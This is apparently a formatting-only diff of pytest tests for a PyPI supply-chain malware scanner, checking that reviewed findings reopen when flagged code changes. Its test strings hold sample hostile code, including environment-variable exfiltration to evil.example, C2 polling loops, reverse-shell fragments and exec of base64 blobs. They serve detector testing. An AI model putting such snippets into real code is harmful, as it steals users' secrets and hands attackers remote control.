@@ -97,7 +97,9 @@ def test_clean_wheel_no_findings():
         str(FIXTURES / "clean_wheel.whl"),
         "clean_fixture",
     )
-    assert findings == [], f"unexpected findings on clean wheel: {[str(f) for f in findings]}"
+    assert (
+        findings == []
+    ), f"unexpected findings on clean wheel: {[str(f) for f in findings]}"
 
 
 # Fork 1 constants -- gated on availability.
@@ -198,7 +200,8 @@ def test_archive_corruption_produces_critical_finding(tmp_path):
     assert findings, "scan_archive returned 0 findings on corrupt wheel"
     corrupted = [f for f in findings if f.check == "archive_corrupted"]
     assert corrupted, (
-        "no archive_corrupted finding; got " f"{[(f.severity, f.check) for f in findings]}"
+        "no archive_corrupted finding; got "
+        f"{[(f.severity, f.check) for f in findings]}"
     )
     assert all(f.severity == sp.CRITICAL for f in corrupted)
 
@@ -262,7 +265,9 @@ def test_check_py_file_ignores_docstring_only_iocs():
         "VERSION = '1.0'\n"
     )
     findings = sp.check_py_file(benign, "pkg/_doc.py", "pkg")
-    assert findings == [], f"docstring IOCs should not flag: {[str(f) for f in findings]}"
+    assert (
+        findings == []
+    ), f"docstring IOCs should not flag: {[str(f) for f in findings]}"
     # The same payload as real code still flags.
     real = (
         "import subprocess, urllib.request\n"
@@ -375,7 +380,9 @@ def test_baseline_key_line_shift_stable_but_code_specific():
 def test_extract_evidence_records_all_matches():
     # The whole point of P1: a match appended after the first few must show up
     # in the evidence, so it changes the key instead of riding the earlier ones.
-    src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(6))
+    src = "import requests\n" + "\n".join(
+        f"requests.get('http://a{i}')" for i in range(6)
+    )
     ev = sp._extract_evidence(src, sp.RE_NETWORK)
     assert ev.count("requests.get(") == 6
 
@@ -383,11 +390,25 @@ def test_extract_evidence_records_all_matches():
 def test_baseline_key_reopens_on_appended_match():
     # A reviewed file already trips a check with several matches; a later exfil
     # call appended to the same file/check must reopen the finding.
-    base_src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(3))
-    payload_src = base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
-    base = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(base_src, sp.RE_NETWORK))
+    base_src = "import requests\n" + "\n".join(
+        f"requests.get('http://a{i}')" for i in range(3)
+    )
+    payload_src = (
+        base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
+    )
+    base = _mk(
+        sp.CRITICAL,
+        "p",
+        "p/net.py",
+        "net",
+        sp._extract_evidence(base_src, sp.RE_NETWORK),
+    )
     payload = _mk(
-        sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(payload_src, sp.RE_NETWORK)
+        sp.CRITICAL,
+        "p",
+        "p/net.py",
+        "net",
+        sp._extract_evidence(payload_src, sp.RE_NETWORK),
     )
     assert sp._finding_key(base) != sp._finding_key(payload)
 
@@ -433,7 +454,9 @@ def test_extract_evidence_caps_long_line_but_binds_tail():
     assert marker not in ev  # tail past the cap is not shown verbatim
     assert "sha256:" in ev  # but it is pinned by a digest
     assert len(ev) < len(line)  # bounded, not the whole minified line
-    base = sp._extract_evidence("requests.get('http://a')  " + pad + "x\n", sp.RE_NETWORK)
+    base = sp._extract_evidence(
+        "requests.get('http://a')  " + pad + "x\n", sp.RE_NETWORK
+    )
     assert sp._evidence_hash(ev) != sp._evidence_hash(base)
 
 
@@ -532,9 +555,9 @@ def test_extract_evidence_same_line_close_then_open_binds_call():
     # changed body on a continuation line reopens.
     old = "x = [a]; requests.post(\n  'http://h/old',\n  data=secret,\n)\n"
     new = "x = [a]; requests.post(\n  'http://h/old',\n  data=EVIL,\n)\n"
-    assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
-        sp._extract_evidence(new, sp.RE_NETWORK)
-    )
+    assert sp._evidence_hash(
+        sp._extract_evidence(old, sp.RE_NETWORK)
+    ) != sp._evidence_hash(sp._extract_evidence(new, sp.RE_NETWORK))
 
 
 def test_extract_evidence_backslash_continued_string_binds_tail():
@@ -544,9 +567,9 @@ def test_extract_evidence_backslash_continued_string_binds_tail():
     # reopen. The blanker tracks the continuation so the whole call binds.
     old = "requests.post('http://h\\\n/path)', data='old')\n"
     new = "requests.post('http://h\\\n/path)', data='EVIL')\n"
-    assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
-        sp._extract_evidence(new, sp.RE_NETWORK)
-    )
+    assert sp._evidence_hash(
+        sp._extract_evidence(old, sp.RE_NETWORK)
+    ) != sp._evidence_hash(sp._extract_evidence(new, sp.RE_NETWORK))
 
 
 def test_extract_evidence_long_call_tail_past_soft_cap_reopens():
@@ -557,9 +580,9 @@ def test_extract_evidence_long_call_tail_past_soft_cap_reopens():
     mid = "\n".join(f"  opt{i}=1," for i in range(sp._MAX_CALL_LINES + 20))
     old = "requests.post(\n" + mid + "\n  data='old',\n)\n"
     new = "requests.post(\n" + mid + "\n  data='EVIL',\n)\n"
-    assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
-        sp._extract_evidence(new, sp.RE_NETWORK)
-    )
+    assert sp._evidence_hash(
+        sp._extract_evidence(old, sp.RE_NETWORK)
+    ) != sp._evidence_hash(sp._extract_evidence(new, sp.RE_NETWORK))
 
 
 def test_extract_evidence_fallback_line_numbers_are_correct():
@@ -622,8 +645,12 @@ def test_extract_evidence_records_all_multiline_matches():
 def test_multiline_evidence_reopens_on_continuation_change():
     # A DOTALL match records every line it spans, so changing the URL inside an
     # already-flagged C2 loop (a continuation line) reopens the finding...
-    old = "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
-    new = "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
+    old = (
+        "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
+    )
+    new = (
+        "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
+    )
     fo = _mk(
         sp.CRITICAL,
         "p",
@@ -728,7 +755,10 @@ def test_extract_evidence_records_multiline_after_oneline():
     # A one-line C2 match no longer suppresses a later multi-line C2 loop: the
     # appended cross-line construct is recorded too, so it cannot ride the key.
     oneline = "while True: time.sleep(60); requests.get('http://a/poll')\n"
-    appended = oneline + "while True:\n    time.sleep(30)\n    requests.get('http://evil/c2')\n"
+    appended = (
+        oneline
+        + "while True:\n    time.sleep(30)\n    requests.get('http://evil/c2')\n"
+    )
     eo = sp._extract_evidence(oneline, sp.RE_C2_POLLING)
     ea = sp._extract_evidence(appended, sp.RE_C2_POLLING)
     assert "evil" in ea
@@ -742,7 +772,11 @@ def test_extract_evidence_giant_span_binds_full_interior():
     # reopens instead of riding the key. (Binding only head/tail would fail open on
     # an interior insertion.) A pure line shift still stays stable.
     gap = "\n".join(f"    x = {i}" for i in range(70))
-    base = "import socket\nsock.connect(addr)\n" + gap + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
+    base = (
+        "import socket\nsock.connect(addr)\n"
+        + gap
+        + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
+    )
     # interior insertion of a cross-line payload between the unchanged outer anchors
     injected = base.replace("    x = 35", "    x = 35\n    sock.connect(evilhost)")
     ea = sp._extract_evidence(base, sp.RE_REVERSE_SHELL)
@@ -782,7 +816,9 @@ def test_hidden_payload_binds_visible_exec_trigger():
     def key(src):
         return [
             sp._finding_key(f)
-            for f in sp._hidden_payload_findings(src, sp._strip_noncode(src), "p/x.py", "p")
+            for f in sp._hidden_payload_findings(
+                src, sp._strip_noncode(src), "p/x.py", "p"
+            )
             if "hidden network+exec" in f.check
         ][0]
 
@@ -794,7 +830,9 @@ def test_js_finding_pins_full_content_digest():
     # that closes the bracket span early cannot let later option/body lines change
     # without reopening (the Python-string-aware extractor would otherwise omit
     # them). Holds for small files too, not just large bundles.
-    old = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'OLD'})\n"
+    old = (
+        "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'OLD'})\n"
+    )
     new = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'EVIL'})\n"
     fo = [f for f in sp.check_js_file(old, "p/w.js", "p") if "Web3" in f.check][0]
     fn = [f for f in sp.check_js_file(new, "p/w.js", "p") if "Web3" in f.check][0]
@@ -840,8 +878,16 @@ def test_base64_exec_blob_finding_binds_every_blob():
     head = "import base64\nblob1 = '" + "A" * 220 + "'\nexec(base64.b64decode(blob1))\n"
     old = head
     new = head + "blob2 = '" + "B" * 220 + "'\n"
-    fo = [f for f in sp.check_py_file(old, "p/x.py", "p") if "large encoded blob" in f.check]
-    fn = [f for f in sp.check_py_file(new, "p/x.py", "p") if "large encoded blob" in f.check]
+    fo = [
+        f
+        for f in sp.check_py_file(old, "p/x.py", "p")
+        if "large encoded blob" in f.check
+    ]
+    fn = [
+        f
+        for f in sp.check_py_file(new, "p/x.py", "p")
+        if "large encoded blob" in f.check
+    ]
     assert fo and fn
     assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
 
@@ -851,8 +897,16 @@ def test_pth_large_blob_finding_binds_every_blob():
     # encoded payload reopens rather than riding the unchanged first blob.
     old = "import os\n" + "X" * 220 + "\n"
     new = old + "Y" * 220 + "\n"
-    fo = [f for f in sp.check_pth_file(old, "p/x.pth", "p") if "large base64-like blob" in f.check]
-    fn = [f for f in sp.check_pth_file(new, "p/x.pth", "p") if "large base64-like blob" in f.check]
+    fo = [
+        f
+        for f in sp.check_pth_file(old, "p/x.pth", "p")
+        if "large base64-like blob" in f.check
+    ]
+    fn = [
+        f
+        for f in sp.check_pth_file(new, "p/x.pth", "p")
+        if "large base64-like blob" in f.check
+    ]
     assert fo and fn
     assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
 
@@ -878,7 +932,9 @@ def test_pth_unusually_large_finding_is_content_bound():
 def test_js_token_network_finding_binds_network_evidence():
     # The JS stealer combo records both the token AND the network call, so a
     # changed exfil endpoint reopens (RE_NETWORK-recognized call used here).
-    old = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://old.example');\n"
+    old = (
+        "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://old.example');\n"
+    )
     new = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://evil.example');\n"
     fo = [f for f in sp.check_js_file(old, "p/p.js", "p") if "stealer" in f.check]
     fn = [f for f in sp.check_js_file(new, "p/p.js", "p") if "stealer" in f.check]
@@ -956,8 +1012,16 @@ def test_hidden_network_exec_reopens_on_endpoint_change():
         '"""\nimport urllib.request, os\nurllib.request.urlopen("http://evil/x").read()\n'
         'os.system("sh -c id")\n"""\nexec(__doc__)\n'
     )
-    fo = [f for f in sp.check_py_file(old, "p/d.py", "p") if "hidden network+exec" in f.check]
-    fn = [f for f in sp.check_py_file(new, "p/d.py", "p") if "hidden network+exec" in f.check]
+    fo = [
+        f
+        for f in sp.check_py_file(old, "p/d.py", "p")
+        if "hidden network+exec" in f.check
+    ]
+    fn = [
+        f
+        for f in sp.check_py_file(new, "p/d.py", "p")
+        if "hidden network+exec" in f.check
+    ]
     assert fo and fn
     assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
 
@@ -967,8 +1031,16 @@ def test_base64_exec_blob_combo_binds_blob_digest():
     # digests it, so a changed payload reopens even with unchanged base64/exec.
     b1 = "BLOB = '" + "A" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
     b2 = "BLOB = '" + "B" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
-    f1 = [f for f in sp.check_py_file(b1, "p/m.py", "p") if "large encoded blob" in f.check]
-    f2 = [f for f in sp.check_py_file(b2, "p/m.py", "p") if "large encoded blob" in f.check]
+    f1 = [
+        f
+        for f in sp.check_py_file(b1, "p/m.py", "p")
+        if "large encoded blob" in f.check
+    ]
+    f2 = [
+        f
+        for f in sp.check_py_file(b2, "p/m.py", "p")
+        if "large encoded blob" in f.check
+    ]
     assert f1 and f2
     assert "Blob: sha256:" in f1[0].evidence
     assert sp._finding_key(f1[0]) != sp._finding_key(f2[0])
@@ -979,8 +1051,16 @@ def test_openssl_key_combo_binds_key_evidence():
     # reopens instead of riding the OpenSSL line alone.
     o1 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----A"\n'
     o2 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----B"\n'
-    g1 = [f for f in sp.check_py_file(o1, "p/o.py", "p") if "openssl encryption" in f.check]
-    g2 = [f for f in sp.check_py_file(o2, "p/o.py", "p") if "openssl encryption" in f.check]
+    g1 = [
+        f
+        for f in sp.check_py_file(o1, "p/o.py", "p")
+        if "openssl encryption" in f.check
+    ]
+    g2 = [
+        f
+        for f in sp.check_py_file(o2, "p/o.py", "p")
+        if "openssl encryption" in f.check
+    ]
     assert g1 and g2
     assert "Key:" in g1[0].evidence
     assert sp._finding_key(g1[0]) != sp._finding_key(g2[0])
@@ -1031,8 +1111,16 @@ def test_large_js_bundle_finding_is_content_bound():
     # so a malicious bundle cannot ride a baselined empty-evidence entry.
     big_a = "var x = 1;\n" * 20000  # ~200 KB, benign
     big_b = big_a + "var exfil = 2;\n"  # different content, same size bucket
-    ja = [f for f in sp.check_js_file(big_a, "pkg/bundle.js", "pkg") if "JS bundle" in f.check]
-    jb = [f for f in sp.check_js_file(big_b, "pkg/bundle.js", "pkg") if "JS bundle" in f.check]
+    ja = [
+        f
+        for f in sp.check_js_file(big_a, "pkg/bundle.js", "pkg")
+        if "JS bundle" in f.check
+    ]
+    jb = [
+        f
+        for f in sp.check_js_file(big_b, "pkg/bundle.js", "pkg")
+        if "JS bundle" in f.check
+    ]
     assert ja and jb, "large JS bundle must produce a finding"
     assert ja[0].evidence.startswith("sha256:")
     assert sp._finding_key(ja[0]) != sp._finding_key(jb[0])
@@ -1062,9 +1150,15 @@ def test_pth_import_lines_record_all_not_first_five():
     # malicious one (first five unchanged) still reopens the catch-all finding.
     base = "".join(f"import mod{i}\n" for i in range(6))
     swapped = "".join(f"import mod{i}\n" for i in range(5)) + "import evil\n"
-    fb = [f for f in sp.check_pth_file(base, "p/x.pth", "p") if "executable import line" in f.check]
+    fb = [
+        f
+        for f in sp.check_pth_file(base, "p/x.pth", "p")
+        if "executable import line" in f.check
+    ]
     fs = [
-        f for f in sp.check_pth_file(swapped, "p/x.pth", "p") if "executable import line" in f.check
+        f
+        for f in sp.check_pth_file(swapped, "p/x.pth", "p")
+        if "executable import line" in f.check
     ]
     assert fb and fs
     assert sp._finding_key(fb[0]) != sp._finding_key(fs[0])
@@ -1194,7 +1288,10 @@ def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
 
     # A NEW kind of finding in the SAME file is a different check -> still active.
     new_kind = _mk(
-        sp.CRITICAL, "fastapi", "fastapi/routing.py", "Reverse shell / bind shell pattern"
+        sp.CRITICAL,
+        "fastapi",
+        "fastapi/routing.py",
+        "Reverse shell / bind shell pattern",
     )
     active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
     assert active2 == [new_kind] and suppressed2 == []
@@ -1266,13 +1363,18 @@ def test_committed_baseline_suppresses_known_but_not_a_new_payload():
         for e in entries
         if e["package"] == "botocore"
         and e["file"] == "botocore/utils.py"
-        and e["check"] == "Harvests environment variables/secrets AND makes network calls"
+        and e["check"]
+        == "Harvests environment variables/secrets AND makes network calls"
     )
     baseline = sp._load_baseline(str(baseline_path))
 
     # The exact reviewed finding is suppressed.
     benign = _mk(
-        target["severity"], target["package"], target["file"], target["check"], target["evidence"]
+        target["severity"],
+        target["package"],
+        target["file"],
+        target["check"],
+        target["evidence"],
     )
     active, suppressed = sp._partition_baseline([benign], baseline)
     assert suppressed == [benign] and active == []
@@ -1299,7 +1401,9 @@ def test_committed_baseline_entries_all_carry_evidence_hash():
     entries = json.loads(baseline_path.read_text())["entries"]
     assert entries, "committed baseline should not be empty"
     missing = [
-        f"{e['package']}:{e['file']}:{e['check']}" for e in entries if not e.get("evidence_hash")
+        f"{e['package']}:{e['file']}:{e['check']}"
+        for e in entries
+        if not e.get("evidence_hash")
     ]
     assert not missing, f"entries missing evidence_hash: {missing[:5]}"
     # And each pinned hash matches a recompute from the stored evidence.
@@ -1355,7 +1459,9 @@ def test_spec_pin_version():
 
 
 def test_release_has_wheel_detects_sdist_only():
-    sdist_only = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
+    sdist_only = _meta(
+        [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")]
+    )
     assert sp._release_has_wheel(sdist_only, None) is False
     assert sp._release_has_wheel(sdist_only, "1.0.0") is False
     has_wheel = _meta(
@@ -1370,7 +1476,9 @@ def test_release_has_wheel_detects_sdist_only():
 def test_is_trusted_pypi_url_only_https_pypi():
     assert sp._is_trusted_pypi_url("https://files.pythonhosted.org/p/x.tar.gz") is True
     assert sp._is_trusted_pypi_url("https://pypi.org/x.tar.gz") is True
-    assert sp._is_trusted_pypi_url("http://files.pythonhosted.org/x.tar.gz") is False  # not https
+    assert (
+        sp._is_trusted_pypi_url("http://files.pythonhosted.org/x.tar.gz") is False
+    )  # not https
     assert sp._is_trusted_pypi_url("https://evil.example/x.tar.gz") is False
     assert sp._is_trusted_pypi_url("https://files.pythonhosted.org.evil.com/x") is False
 
@@ -1401,21 +1509,28 @@ def test_marker_holds_by_default():
     assert sp._marker_holds_by_default('extra == "dev"') is False
     # Default-true markers that mention extra must be kept.
     assert sp._marker_holds_by_default("extra != 'dev'") is True
-    assert sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
+    assert (
+        sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
+    )
     # No marker / plain env marker -> kept.
     assert sp._marker_holds_by_default("") is True
     # Platform/python markers are kept: the scanner runs on one target but the
     # package may install on another, so these deps must still be scanned.
     assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
     assert sp._marker_holds_by_default("python_version == '3.13'") is True
-    assert sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'") is True
+    assert (
+        sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'")
+        is True
+    )
 
 
 def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
     # The pinned release's own metadata cannot be fetched -> recover nothing
     # rather than substituting the latest release's (wrong) dependency tree.
     project = _meta([], requires = ["latestdep==9.9.9"])
-    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
+    monkeypatch.setattr(
+        sp, "_pypi_json", lambda name, version = None: None if version else project
+    )
     assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []
 
 
@@ -1424,7 +1539,9 @@ def test_requires_dist_for_uses_pinned_release(monkeypatch):
     # release does. _requires_dist_for must follow the pinned release's tree.
     project = _meta([], requires = ["harmless>=1"])
     pinned = _meta([], requires = ["payload==1.0.0"])
-    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: pinned if version else project)
+    monkeypatch.setattr(
+        sp, "_pypi_json", lambda name, version = None: pinned if version else project
+    )
     specs = sp._requires_dist_for("oldpkg", "1.0.0", project)
     assert "payload==1.0.0" in specs
     assert "harmless>=1" not in specs
@@ -1434,7 +1551,9 @@ def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
     # Missing pinned metadata must surface an incomplete-scan error, not a silent
     # [] that a caller cannot tell apart from a genuine no-deps release.
     project = _meta([], requires = ["latestdep==9.9.9"])
-    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
+    monkeypatch.setattr(
+        sp, "_pypi_json", lambda name, version = None: None if version else project
+    )
     errors: list[str] = []
     assert sp._requires_dist_for("oldpkg", "1.0.0", project, errors) == []
     assert errors and "incomplete" in errors[0]
@@ -1443,7 +1562,13 @@ def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
 def test_release_files_pinned_missing_fails_closed():
     # A pin absent from metadata must NOT fall back to the latest artifact.
     meta = _meta(
-        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
+        [
+            _f(
+                "sdist",
+                "x-2.0.0.tar.gz",
+                "https://files.pythonhosted.org/x-2.0.0.tar.gz",
+            )
+        ],
         version = "2.0.0",
     )
     assert sp._release_files(meta, "9.9.9") == []  # missing pin -> empty, not latest
@@ -1455,7 +1580,13 @@ def test_release_files_pinned_missing_fails_closed():
 def test_download_sdist_direct_missing_pin_does_not_scan_latest(tmp_path):
     # Pinned version absent -> no sdist returned (never the latest file).
     meta = _meta(
-        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
+        [
+            _f(
+                "sdist",
+                "x-2.0.0.tar.gz",
+                "https://files.pythonhosted.org/x-2.0.0.tar.gz",
+            )
+        ],
         version = "2.0.0",
     )
     fpath, err = sp._download_sdist_direct("x", "9.9.9", str(tmp_path), meta = meta)
@@ -1478,9 +1609,17 @@ def test_download_sdist_direct_no_sdist_published(tmp_path):
 
 def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch):
     payload = b"\x1f\x8b" + b"fake-tar-gz-bytes"
-    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(payload))
+    monkeypatch.setattr(
+        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(payload)
+    )
     meta = _meta(
-        [_f("sdist", "langid-1.1.6.tar.gz", "https://files.pythonhosted.org/langid-1.1.6.tar.gz")],
+        [
+            _f(
+                "sdist",
+                "langid-1.1.6.tar.gz",
+                "https://files.pythonhosted.org/langid-1.1.6.tar.gz",
+            )
+        ],
         version = "1.1.6",
     )
     fpath, err = sp._download_sdist_direct("langid", "1.1.6", str(tmp_path), meta = meta)
@@ -1491,8 +1630,12 @@ def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch
 
 def test_download_sdist_direct_size_cap(tmp_path, monkeypatch):
     monkeypatch.setattr(sp, "_MAX_SDIST_BYTES", 8)
-    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"x" * 100))
-    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
+    monkeypatch.setattr(
+        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"x" * 100)
+    )
+    meta = _meta(
+        [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")]
+    )
     fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
     assert fpath is None and "cap" in err
 
@@ -1527,7 +1670,13 @@ def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
         sp,
         "_pypi_json",
         lambda name, version = None: _meta(
-            [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x-1.0.0.tar.gz")]
+            [
+                _f(
+                    "sdist",
+                    "x-1.0.0.tar.gz",
+                    "https://files.pythonhosted.org/x-1.0.0.tar.gz",
+                )
+            ]
         ),
     )
     monkeypatch.setattr(
